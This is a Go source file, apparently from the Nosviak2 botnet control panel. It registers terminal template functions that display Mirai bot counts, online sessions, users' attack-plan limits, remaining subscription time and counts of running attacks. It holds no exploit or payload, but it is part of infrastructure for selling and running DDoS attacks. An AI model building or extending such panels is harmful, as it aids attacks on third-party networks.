package language

import (
	"Nosviak2/core/clients/animations"
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/database"
	"Nosviak2/core/sources/language/tfx"
	"Nosviak2/core/slaves/mirai"
	"Nosviak2/core/sources/views"
	"errors"
	"io"
	"strconv"
	"strings"
	"time"
)

//stores the termfx information properly
//this will register all the options without issues happening
func MakeTermFX(f []string, s *sessions.Session) (string, error) {

	//makes the termfx wrapper properly
	//this will ensure its done without any errors
	regTerm := termfx.New() //this will ensure its done without any errors

	//registers the user information properly
	//this will ensure its done without any errors

	//registers the spinner function
	//this will ensure its done without any errors happening
	regTerm.RegisterFunction("spinner", func(session io.Writer, args string) (int, error) {
		//tries to access the current frame
		//this will ensure its done without any errors
		render, err := animations.AccessCurrentFrame(strings.ReplaceAll(args, "\"", ""))
		if err != nil { //error handles properly without errors
			return 0, err //returns the error
		}

		//writes the current frame properly
		//this will ensure its done without any errors
		return session.Write([]byte(render)) //written
	})

	regTerm.RegisterFunction("mirai", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.Itoa(mirai.MiraiSlaves.Count))) //written
	})

	regTerm.RegisterFunction("online", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.Itoa(len(sessions.Sessions)))) //written
	})

	//registers the username properly
	//this will allow us to access it without issues
	regTerm.RegisterFunction("username", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(s.User.Username)) //written
	})

	//registers the maxtime properly
	//this will allow us to access it without issues
	regTerm.RegisterFunction("maxtime", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.Itoa(s.User.MaxTime))) //written
	})

	//registers the cooldown properly
	//this will allow us to access it without issues
	regTerm.RegisterFunction("cooldown", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.Itoa(s.User.Cooldown))) //written
	})

	//registers the concurrents properly
	//this will allow us to access it without issues
	regTerm.RegisterFunction("concurrents", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.Itoa(s.User.Concurrents))) //written
	})

	//registers the days left properly
	//this will allow us to access it without issues
	regTerm.RegisterFunction("daysleft", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.FormatFloat(time.Duration(time.Until(time.Unix(s.User.Expiry, 0))).Hours()/24, 'f', 2, 64)))
	})

	//registers the hours left properly
	//this will allow us to access it without issues
	regTerm.RegisterFunction("hoursleft", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.FormatFloat(time.Duration(time.Until(time.Unix(s.User.Expiry, 0))).Hours(), 'f', 2, 64)))
	})

	//registers the myrunning function properly
	//this will ensure its done without any errors happening
	regTerm.RegisterFunction("myrunning", func(session io.Writer, args string) (int, error) {
		//tries to get the ongoing from the database
		//this will ensure its done without any errors happening
		running, err := database.Conn.Attacking(s.User.Username)
		if err != nil { //error handles the statement properly
			return 0, err //returns the error properly
		}

		//writes the current frame properly
		//this will ensure its done without any errors
		return session.Write([]byte(strconv.Itoa(len(running)))) //written
	})

	//registers the ongoing function properly
	//this will ensure its done without any errors happening
	regTerm.RegisterFunction("ongoing", func(session io.Writer, args string) (int, error) {
		//tries to get the ongoing from the database
		//this will ensure its done without any errors happening
		running, err := database.Conn.GlobalRunning()
		if err != nil { //error handles the statement properly
			return 0, err //returns the error properly
		}

		//writes the current frame properly
		//this will ensure its done without any errors
		return session.Write([]byte(strconv.Itoa(len(running)))) //written
	})

	//adds support for the theme render
	//this will allow for proper management without issues
	path := RenderParser(f, s) //properly tries without issues

	//tries to get properly without issues
	//this will get without issues happening
	value := views.GetView(path...) //gets within the theme properly
	if value == nil { //checks if the theme was found properly
		//tries to get the default properly theme without issues happening
		def := views.GetView(f...) //gets the default properly without issues
		if def == nil { //error handles properly without issues happening on reqeust
			return "", errors.New(strings.Join(f, "/")+" is classed as an invalid branding object")
		}

		//updates the default properly
		//this will select the default branding without issues
		value = def //updates to the default properly without issues
	}


	//executes the term properly
	//this will ensure its done without any errors
	return regTerm.ExecuteString(value.Containing)
}